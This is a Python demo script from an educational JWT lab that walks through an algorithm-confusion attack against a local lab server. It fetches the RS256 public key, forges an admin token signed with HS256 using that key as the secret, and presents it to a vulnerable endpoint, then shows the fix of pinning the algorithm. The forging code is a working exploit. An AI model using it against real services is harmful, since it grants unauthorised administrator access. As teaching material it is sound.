import warnings
warnings.filterwarnings("ignore")

import time
import hmac
import hashlib
import base64
import json
import httpx
import jwt
from contextlib import contextmanager
from rich.console import Console
from rich.panel import Panel
from rich.text import Text


BASE_URL = "http://172.28.64.1:8000"

console = Console()

def b64_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def build_hs256_token(payload: dict, secret: bytes) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    encoded_header = b64_encode(json.dumps(header, separators=(",", ":")).encode())
    encoded_payload = b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{encoded_header}.{encoded_payload}".encode()
    signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{encoded_header}.{encoded_payload}.{b64_encode(signature)}"

def typewrite(text: str, style: str = "", delay: float = 0.04):
    for char in text:
        console.print(char, style=style, end="")
        time.sleep(delay)
    console.print()

@contextmanager
def spinning(message: str, duration: float = 1.5):
    with console.status(f"[cyan]{message}[/cyan]", spinner="dots"):
        time.sleep(duration)
        yield
    console.print(f"  [green]✓[/green] {message}")

def main():
    console.clear()
    time.sleep(0.5)

    # Banner
    console.print(Panel(
        Text("JWT Lab - Attack 5: Algorithm Confusion\nRS256 -> HS256", justify="center", style="bold white"),
        subtitle="[dim]github.com/joandies/jwt-lab[/dim]",
        border_style="cyan",
    ))
    time.sleep(1.0)

    console.print()
    typewrite("The server uses RS256 (asymmetric). Its public key is exposed at /public-key.", style="dim")
    typewrite("We will use that public key as an HMAC secret to forge a valid HS256 token.", style="dim")
    time.sleep(2.0)

    # Step 1
    console.print()
    console.rule("[cyan]Step 1 - Fetch the public key[/cyan]")
    time.sleep(0.5)
    typewrite("-> The public key is public by definition. No credentials needed.", style="yellow")
    time.sleep(0.5)

    with spinning("Fetching public key from /public-key...", duration=1.5):
        response = httpx.get(f"{BASE_URL}/public-key")
        public_key = response.json()["public_key"]

    console.print(f"  [green]Public key retrieved[/green] ({len(public_key)} bytes)")
    console.print(f"  [dim]{public_key[:64].strip()}...[/dim]")
    time.sleep(2.0)

    # Step 2
    console.print()
    console.rule("[cyan]Step 2 - Build a forged payload[/cyan]")
    time.sleep(0.5)
    typewrite("-> We craft a payload claiming admin role. No login required.", style="yellow")
    time.sleep(0.5)

    forged_payload = {"sub": "admin", "role": "admin"}
    console.print(f"  [green]Forged payload:[/green] {forged_payload}")
    time.sleep(2.0)

    # Step 3
    console.print()
    console.rule("[cyan]Step 3 - Sign with HS256 using the public key as secret[/cyan]")
    time.sleep(0.5)
    typewrite("-> JWT libraries block this. We build the token manually with hmac + hashlib.", style="yellow")
    time.sleep(0.5)

    with spinning("Signing forged token...", duration=1.2):
        forged_token = build_hs256_token(forged_payload, public_key.encode("utf-8"))

    console.print(f"  [green]Forged token:[/green] {forged_token[:60]}...")
    time.sleep(2.0)

    # Step 4
    console.print()
    console.rule("[cyan]Step 4 - Send to /vuln/alg-confusion[/cyan]")
    time.sleep(0.5)
    typewrite("-> The server accepts both RS256 and HS256. It verifies our token with PUBLIC_KEY.", style="yellow")
    typewrite("-> We signed with PUBLIC_KEY. The verification passes.", style="yellow")
    time.sleep(0.5)

    with spinning("Sending forged token to server...", duration=1.2):
        response = httpx.get(
            f"{BASE_URL}/vuln/alg-confusion",
            headers={"Authorization": f"Bearer {forged_token}"},
        )

    # Result
    console.print()
    if response.status_code == 200:
        data = response.json()
        console.print(Panel(
            f"[bold green]ATTACK SUCCESSFUL[/bold green]\n\n"
            f"Server response: {data['message']}\n"
            f"Payload accepted: {data['payload']}",
            border_style="green",
        ))
    else:
        console.print(Panel(
            f"[bold red]ATTACK FAILED[/bold red]\n{response.text}",
            border_style="red",
        ))

    time.sleep(1.5)

    # Lesson
    console.print()
    console.print(Panel(
        "[bold]The vulnerability:[/bold] the server let the token header decide the algorithm.\n\n"
        "[bold]The fix:[/bold] hardcode the expected algorithm server-side.\n"
        "         [green]algorithms=[\"RS256\"][/green]  - never allow HS256 as a fallback.",
        title="[yellow]Key takeaway[/yellow]",
        border_style="yellow",
    ))
    time.sleep(1.0)
    console.print()

if __name__ == "__main__":
    main()